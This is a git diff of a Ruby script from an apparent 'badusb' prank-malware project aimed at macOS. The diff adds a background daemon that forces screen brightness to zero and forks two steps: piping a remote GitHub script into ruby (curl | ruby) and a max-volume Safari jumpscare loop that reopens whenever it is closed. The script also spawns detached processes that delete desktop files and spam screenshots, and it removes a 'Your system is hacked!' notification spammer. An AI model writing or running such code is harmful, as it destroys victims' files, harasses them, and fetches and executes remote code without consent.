@@ -78,12 +78,18 @@ def persistent_jumpscare(video_url)
   
   loop do
     set_volume_to_max
+    # Open the jumpscare page in Safari.
     system("open -a Safari '#{html_file}'")
+    # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    sleep 0.85  # Delay simulating sound detection
+    # Wait 0.85 seconds (simulate waiting for sound detection).
+    sleep 0.85
+    # Unhide Safari so the jumpscare becomes visible.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
-    sleep 1     # Let the jumpscare play for 1 second
+    # Let the jumpscare play for 1 second.
+    sleep 1
 
+    # Check if any Safari tab's URL contains "jumpscare".
     check_script = %Q{
       tell application "Safari"
         set found to false
@@ -96,11 +102,44 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
+    # If not found (i.e. if the page was closed), reopen it.
     unless result.include?("true")
       system("open -a Safari '#{html_file}'")
     end
     sleep 3
   end
+end
+
+# --- Maintain Darkness: Set brightness to 0 without Homebrew (Detached Process) ---
+def set_brightness_to_zero
+  # AppleScript to open Displays pane, set brightness slider to 0, then close System Preferences.
+  script = <<-APPLESCRIPT
+tell application "System Preferences"
+    reveal anchor "displaysDisplayTab" of pane id "com.apple.preference.displays"
+    delay 0.5
+end tell
+tell application "System Events"
+    tell process "System Preferences"
+        try
+            set brightnessSlider to slider 1 of window 1
+            set value of brightnessSlider to 0
+        end try
+    end tell
+end tell
+tell application "System Preferences" to quit
+  APPLESCRIPT
+  system("osascript -e '#{script}'")
+end
+
+def maintain_darkness
+  pid = fork do
+    Process.daemon(true, true)
+    loop do
+      set_brightness_to_zero
+      sleep 3
+    end
+  end
+  Process.detach(pid)
 end
 
 # --- Spam Screenshots Function (Detached Process) ---
@@ -128,58 +167,22 @@ def delete_desktop_files
   Process.detach(pid)
 end
 
-# --- Maintain Darkness: Set Brightness to 0 Every 3 Seconds (Detached Process) ---
-def maintain_darkness
-  pid = fork do
-    Process.daemon(true, true)
-    loop do
-      if system("command -v brightness > /dev/null 2>&1")
-        system("brightness 0")
-      end
-      sleep 3
-    end
-  end
-  Process.detach(pid)
-end
-
 # --- Run Secret (Rickroll) Script ---
 def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
 end
 
-# --- Jo Action: Combine Multiple Actions ---
+# --- Jo Action ---
+# Executes spam screenshots, delete desktop files, maintain darkness, run secret script,
+# and launch persistent Momo jumpscare.
 def jo_action
   spam_screenshots
   delete_desktop_files
   maintain_darkness
-  spam_notifications
-  spam_wallpaper
-  run_secret_script
-  persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
-end
-
-# --- Spam Notifications Function (Detached Process) ---
-def spam_notifications
-  pid = fork do
-    Process.daemon(true, true)
-    loop do
-      system("osascript -e 'display notification \"Your system is hacked!\" with title \"ALERT\"'")
-      sleep 0.5
-    end
-  end
-  Process.detach(pid)
-end
-
-# --- Spam Wallpaper Function (Detached Process) ---
-def spam_wallpaper
-  pid = fork do
-    Process.daemon(true, true)
-    loop do
-      system("osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns\"'")
-      sleep 2
-    end
-  end
-  Process.detach(pid)
+  pid1 = fork { run_secret_script }
+  Process.detach(pid1)
+  pid2 = fork { persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4") }
+  Process.detach(pid2)
 end
 
 # --- Subscriber Branch Prompts ---
@@ -236,7 +239,7 @@ def subscriber_action
   else
     puts "Unexpected button choice in first prompt: #{first_choice}"
   end
-
+  
   system("killall Terminal")
   exit 0
 end
